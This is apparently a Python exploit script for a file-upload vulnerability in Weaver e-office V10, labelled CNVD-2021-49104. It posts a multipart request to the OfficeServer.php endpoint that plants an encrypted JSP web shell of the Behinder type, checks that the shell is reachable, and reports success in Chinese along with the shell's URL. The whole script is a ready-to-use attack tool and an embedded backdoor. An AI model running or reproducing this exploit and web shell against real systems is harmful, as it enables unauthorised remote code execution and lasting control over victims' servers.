#CNVD-2021-49104
import re
import time
import requests
import urllib3
from rich.console import Console


console = Console()
def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())

proxies={'http':'http://127.0.0.1:8080'}    
def main(target_url):
    if target_url[:4]!='http':
        target_url = 'http://' + target_url
    if target_url[-1]!='/':
        target_url += '/' 
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0',
        "Content-Type":"multipart/form-data; boundary=----WebKitFormBoundaryLpoiBFy4ANA8daew",
        }
    data='------WebKitFormBoundaryLpoiBFy4ANA8daew\r\nContent-Disposition: form-data;name=\"FileData\";filename=\"test.php\"\r\nContent-Type: application/octet-stream\r\n\r\n9df37afc77bdd582d90aefaf4e35c63e<%@page import="java.util.*,java.io.*,javax.crypto.*,javax.crypto.spec.*" %><%! private byte[] Decrypt(byte[] data) throws Exception { String k="e45e329feb5d925b"; javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES/ECB/PKCS5Padding");c.init(2,new javax.crypto.spec.SecretKeySpec(k.getBytes(),"AES")); byte[] decodebs; Class baseCls ; try{ baseCls=Class.forName("java.util.Base64"); Object Decoder=baseCls.getMethod("getDecoder", null).invoke(baseCls, null); decodebs=(byte[]) Decoder.getClass().getMethod("decode", new Class[]{byte[].class}).invoke(Decoder, new Object[]{data}); } catch (Throwable e) { System.out.println("444444"); baseCls = Class.forName("sun.misc.BASE64Decoder"); Object Decoder=baseCls.newInstance(); decodebs=(byte[]) Decoder.getClass().getMethod("decodeBuffer",new Class[]{String.class}).invoke(Decoder, new Object[]{new String(data)}); } return c.doFinal(decodebs); } %><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){ ByteArrayOutputStream bos = new ByteArrayOutputStream(); byte[] buf = new byte[512]; int length=request.getInputStream().read(buf); while (length>0) { byte[] data= Arrays.copyOfRange(buf,0,length); bos.write(data); length=request.getInputStream().read(buf); } new U(this.getClass().getClassLoader()).g(Decrypt(bos.toByteArray())).newInstance().equals(pageContext);} %>\r\n\r\n------WebKitFormBoundaryLpoiBFy4ANA8daew\r\nContent-Disposition: form-data;name=\"FormData\"\r\n\r\n{"USERNAME":"admin","RECORDID":"undefined","OPTION":"SAVEFILE","FILENAME":"test.php"}\r\n------WebKitFormBoundaryLpoiBFy4ANA8daew--\r\n'
    exp_url=target_url+'eoffice10/server/public/iWebOffice2015/OfficeServer.php'
    shell_url=target_url+"eoffice10/server/public/iWebOffice2015/Document/test.php"
    console.print(now_time() + " [INFO]     正在检测泛微V10文件上传漏洞", style='bold blue')
    try:
        requests.packages.urllib3.disable_warnings()
        upload = requests.post(exp_url, headers=headers, data=data, verify=False)
        shell=requests.get(shell_url,verify=False)
        if upload.status_code == 200:
            if shell.status_code == 200:
                console.print(now_time() + ' [SUCCESS]  泛微文件上传漏洞存在,冰蝎默认密码:{}'.format(shell_url), style='bold green')
            else:
                console.print(now_time() + ' [WARNING]  泛微ktreeuploadAction上传漏洞payload执行成功，但木马检测失败哦', style='bold yellow ')
        else:
            console.print(now_time() + ' [WARNING]  泛微ktreeuploadAction文件上传漏洞不存在', style='bold red ')
    except:
        console.print(now_time() + " [ERROR]    代码异常，或无法连接目标 ", style='bold red')
    
    
    
    
    
 
        
    
